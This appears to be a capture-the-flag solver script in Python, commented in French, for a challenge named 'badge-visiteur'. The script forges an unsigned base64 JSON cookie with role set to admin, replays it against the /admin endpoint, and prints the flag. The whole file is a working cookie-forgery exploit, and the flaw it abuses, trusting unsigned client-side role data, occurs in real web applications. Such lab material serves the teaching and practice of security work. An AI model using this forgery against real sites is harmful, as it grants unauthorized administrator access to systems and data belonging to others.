#!/usr/bin/env python3
"""Solveur badge-visiteur.

Le cookie `badge` est un JSON base64 non signe. On remplace role=visiteur par
role=admin et on rejoue /admin.
"""
import base64
import json
import sys
import urllib.request

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:1342"


def main():
    forged = base64.b64encode(
        json.dumps({"name": "Invite", "role": "admin"}).encode()
    ).decode()
    req = urllib.request.Request(BASE + "/admin", headers={"Cookie": "badge=" + forged})
    body = urllib.request.urlopen(req).read().decode()
    print(body)
    print(json.loads(body)["flag"])


if __name__ == "__main__":
    main()
